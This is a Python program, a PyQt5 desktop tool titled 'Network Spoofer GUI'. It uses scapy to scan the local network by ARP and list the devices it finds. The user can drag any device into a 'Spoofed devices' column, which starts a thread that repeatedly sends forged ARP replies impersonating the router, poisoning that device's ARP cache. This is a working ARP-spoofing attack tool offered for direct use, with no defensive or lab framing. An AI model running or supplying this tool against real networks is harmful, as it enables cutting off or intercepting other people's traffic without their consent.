import sys
import socket
import datetime
import json
from scapy.all import ARP, Ether, srp, sendp, get_if_hwaddr, conf
from PyQt5 import QtWidgets, QtCore, QtGui
import traceback

DARK_QSS = """
*{background:#121212;color:#dcdcdc;font-family:"Segoe UI",Roboto,sans-serif;font-size:10.5pt}QMenuBar{background:#202020}QMenuBar::item{padding:4px 12px}QMenuBar::item:selected{background:#2a2a2a}QLabel[columnTitle=true]{font-size:12pt;font-weight:600;color:#f0f0f0;padding:4px}QFrame[class=deviceCard]{background:#1e1e1e;border:1px solid #353535;border-radius:8px;padding:6px}QFrame[class=deviceCard]:hover{background:#282828;border-color:#4a90e2}QLabel.title{color:#eaeaea;font-weight:600}QLabel.subtitle{color:#a0a0a0;font-size:9pt}QLabel.indexLbl{color:#fff;background:#4a90e2;padding:1px 4px;border-radius:4px;min-width:22px;max-width:22px;qproperty-alignment:AlignCenter;font-size:8pt}QScrollBar:vertical{background:#1a1a1a;width:10px;margin:0}QScrollBar::handle:vertical{background:#3c3c3c;min-height:20px;border-radius:4px}QScrollBar::handle:vertical:hover{background:#4a90e2}QScrollBar::add-line:vertical,QScrollBar::sub-line:vertical{height:0}QScrollBar::add-page:vertical,QScrollBar::sub-page:vertical{background:0 0}
"""

conf.verb = 0

class ScanThread(QtCore.QThread):
    device_found = QtCore.pyqtSignal(dict)

    def __init__(self, iface, network):
        super().__init__()
        self.iface = iface
        self.network = network
        self._running = True
        self.first_seen = {}

    def run(self):
        while self._running:
            ans, _ = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=self.network),
                iface=self.iface, timeout=2, verbose=False
            )
            ts = datetime.datetime.now()
            for _, r in ans:
                ip, mac = r.psrc, r.src
                try:
                    name = socket.gethostbyaddr(ip)[0]
                except socket.herror:
                    name = ip
                self.first_seen.setdefault(ip, ts)
                self.device_found.emit({
                    "ip": ip, "mac": mac, "name": name,
                    "first_seen": self.first_seen[ip].isoformat(sep=" ", timespec="seconds"),
                    "last_seen":  ts.isoformat(sep=" ", timespec="seconds"),
                    "interface":  self.iface,
                })

            for _ in range(50):
                if not self._running:
                    break
                self.msleep(100)

    def stop(self):
        """Signal the thread to exit (non-blocking)."""
        print("[DBG] ScanThread.stop() called")
        self._running = False
        self.requestInterruption()
        self.quit()


class SpoofThread(QtCore.QThread):
    """
    Continuously sends an ARP-reply to poison one target.
    Stops cleanly when .stop() is called.
    """
    def __init__(self, iface: str,
                 target_ip: str, target_mac: str,
                 router_ip: str, our_mac: str,
                 interval: float = 2.0):
        super().__init__()
        self.iface, self.interval = iface, interval
        self._running = True

        self.pkt = (
            Ether(src=our_mac, dst=target_mac) /
            ARP(op=2, psrc=router_ip, pdst=target_ip, hwsrc=our_mac)
        )

    def run(self):
        while self._running:
            sendp(self.pkt, iface=self.iface, verbose=False)
            self.msleep(int(self.interval * 1000))

    def stop(self):
        """Ask the loop to exit; return immediately."""
        self._running = False
        self.requestInterruption()
        self.quit()

CARD_MIME = "application/x-device"

class DeviceCard(QtWidgets.QFrame):
    def __init__(self, info: dict, index: int):
        super().__init__()
        self.info = info
        self.setProperty("class", "deviceCard")
        self.setCursor(QtCore.Qt.OpenHandCursor)

        h = QtWidgets.QHBoxLayout(self)
        h.setContentsMargins(6,4,6,4)
        h.setSpacing(8)

        self.idx_lbl = QtWidgets.QLabel(str(index))
        self.idx_lbl.setProperty("class", "indexLbl")
        h.addWidget(self.idx_lbl)

        v = QtWidgets.QVBoxLayout()
        v.setSpacing(2)
        self.name_lbl = QtWidgets.QLabel(info["name"]); self.name_lbl.setProperty("class","title")
        self.ip_lbl = QtWidgets.QLabel(info["ip"]);   self.ip_lbl.setProperty("class","subtitle")
        v.addWidget(self.name_lbl); v.addWidget(self.ip_lbl)
        h.addLayout(v)

        self.setToolTip(self._tt())

    def _tt(self):
        i=self.info
        return (f"<b>{i['name']}</b><br>IP: {i['ip']}<br>MAC: {i['mac']}<br>"
                f"First seen: {i['first_seen']}<br>Last seen: {i['last_seen']}<br>Interface: {i['interface']}")

    def mousePressEvent(self, e):
        if e.button()==QtCore.Qt.LeftButton:
            self._drag_start=e.pos()
        super().mousePressEvent(e)
    def mouseMoveEvent(self,e):
        if not(e.buttons()&QtCore.Qt.LeftButton):return
        if (e.pos()-self._drag_start).manhattanLength()<QtWidgets.QApplication.startDragDistance():return
        drag=QtGui.QDrag(self); mime=QtCore.QMimeData(); mime.setData(CARD_MIME,json.dumps(self.info).encode()); drag.setMimeData(mime); drag.setPixmap(self.grab()); drag.exec_(QtCore.Qt.MoveAction)

class DeviceArea(QtWidgets.QScrollArea):
    device_dropped=QtCore.pyqtSignal(dict)
    def __init__(self,title):
        super().__init__();self.setWidgetResizable(True);self.setAcceptDrops(True);self.cards={}
        heading=QtWidgets.QLabel(title);heading.setProperty("columnTitle",True)
        self.inner=QtWidgets.QWidget();self.vbox=QtWidgets.QVBoxLayout(self.inner);self.vbox.setSpacing(8);self.vbox.setContentsMargins(4,0,4,4);self.vbox.addStretch()
        outer=QtWidgets.QVBoxLayout();outer.addWidget(heading);outer.addWidget(self.inner)
        c=QtWidgets.QWidget();c.setLayout(outer);self.setWidget(c)

    def _renumber(self):
        for idx,(ip,card) in enumerate(self.cards.items(),1):
            card.idx_lbl.setText(str(idx))

    def add_or_update(self,info):
        ip=info['ip']
        if ip in self.cards:
            c=self.cards[ip];c.info=info;c.name_lbl.setText(info['name']);c.ip_lbl.setText(info['ip']);c.setToolTip(c._tt())
        else:
            card=DeviceCard(info,len(self.cards)+1)
            self.cards[ip]=card
            self.vbox.insertWidget(self.vbox.count()-1,card)
        self._renumber()

    def remove(self,ip):
        card=self.cards.pop(ip,None)
        if card:
            self.vbox.removeWidget(card);card.setParent(None)
            self._renumber()
        return card

    def dragEnterEvent(self,e):
        if e.mimeData().hasFormat(CARD_MIME):e.acceptProposedAction()
    def dragMoveEvent(self,e):
        if e.mimeData().hasFormat(CARD_MIME):e.acceptProposedAction()
    def dropEvent(self,e):
        if e.mimeData().hasFormat(CARD_MIME):
            info=json.loads(bytes(e.mimeData().data(CARD_MIME)).decode());self.device_dropped.emit(info);e.acceptProposedAction()

class MainWindow(QtWidgets.QMainWindow):
    def __init__(self, iface: str, network: str):
        super().__init__()
        self.setWindowTitle("Network Spoofer GUI")
        self.resize(980, 560)

        mbar = self.menuBar()
        mbar.addMenu("Settings")

        quit_btn = QtWidgets.QPushButton("✕")
        quit_btn.setToolTip("Use this close button to exit safely and stop any nasty threads.")
        quit_btn.setFixedSize(30, 20)

        quit_btn.setStyleSheet(
            "QPushButton { background:#c73737; color:#fff; border:none; "
            "border-radius:4px; font-weight:bold; padding-bottom:1px; }"
            "QPushButton:hover { background:#e85353; }"
        )
        quit_btn.clicked.connect(self.safe_exit)

        wrapper = QtWidgets.QWidget()
        wrap_lay = QtWidgets.QHBoxLayout(wrapper)
        wrap_lay.setContentsMargins(0, 0, 8, 0)
        wrap_lay.setSpacing(0)
        wrap_lay.addWidget(quit_btn)

        mbar.setCornerWidget(wrapper, QtCore.Qt.TopRightCorner)

        splitter = QtWidgets.QSplitter(QtCore.Qt.Horizontal)
        self.live  = DeviceArea("Live scanned devices")
        self.spoof = DeviceArea("Spoofed devices")
        splitter.addWidget(self.live)
        splitter.addWidget(self.spoof)
        splitter.setSizes([500, 500])

        cw   = QtWidgets.QWidget()
        lay  = QtWidgets.QHBoxLayout(cw)
        lay.setContentsMargins(0, 0, 0, 0)
        lay.addWidget(splitter)
        self.setCentralWidget(cw)

        self.router_ip = "192.168.127.1"
        self.our_mac   = get_if_hwaddr(iface)
        self.spoofers: dict[str, SpoofThread] = {}

        self.scan = ScanThread(iface, network)
        self.scan.device_found.connect(self._handle_scan)
        self.scan.start()
        print("[DBG] ScanThread started")

        self.live.device_dropped.connect(self._stop_spoof_via_drag)
        self.spoof.device_dropped.connect(self._start_spoof_via_drag)

    def _handle_scan(self, info: dict):
        if info["ip"] in self.spoof.cards:
            return
        self.live.add_or_update(info)

    def _start_spoof_via_drag(self, info: dict):
        ip = info["ip"]
        if not self.live.remove(ip):
            return
        self.spoof.add_or_update(info)
        self._start_spoofer(info)

    def _stop_spoof_via_drag(self, info: dict):
        ip = info["ip"]
        if not self.spoof.remove(ip):
            return
        self.live.add_or_update(info)
        self._stop_spoofer(ip)

    def _start_spoofer(self, info: dict):
        ip  = info["ip"]
        mac = info["mac"]

        if ip in self.spoofers:
            self._stop_spoofer(ip)

        thr = SpoofThread(
            self.scan.iface, ip, mac,
            self.router_ip, self.our_mac
        )
        self.spoofers[ip] = thr
        thr.started.connect(lambda: print(f"[DBG] SpoofThread {ip} started"))
        thr.finished.connect(lambda: print(f"[DBG] SpoofThread {ip} finished"))
        thr.start()

    def _stop_spoofer(self, ip: str):
        thr = self.spoofers.pop(ip, None)
        if thr:
            print(f"[DBG] Stopping SpoofThread {ip} …")
            thr.stop()

    def safe_exit(self):
        print("\n[DBG] ===== shutdown requested =====")
        print(f"[DBG]  ScanThread running: {self.scan.isRunning()}")
        print(f"[DBG]  SpoofThreads alive: {list(self.spoofers)}")

        for ip, thr in list(self.spoofers.items()):
            print(f"[DBG]  stopping spoofer {ip}")
            thr.stop()

        if self.scan.isRunning():
            print("[DBG]  signalling ScanThread to stop …")
            self.scan.stop()

        print("[DBG]  all stop signals sent – GUI will close shortly")

        QtCore.QTimer.singleShot(300, QtWidgets.QApplication.quit)

    def closeEvent(self, ev: QtGui.QCloseEvent):
        self.safe_exit()
        ev.ignore()




if __name__=='__main__':
    app=QtWidgets.QApplication(sys.argv);app.setStyle('Fusion');app.setStyleSheet(DARK_QSS)
    window=MainWindow('Ethernet','192.168.127.0/24');window.show();sys.exit(app.exec_())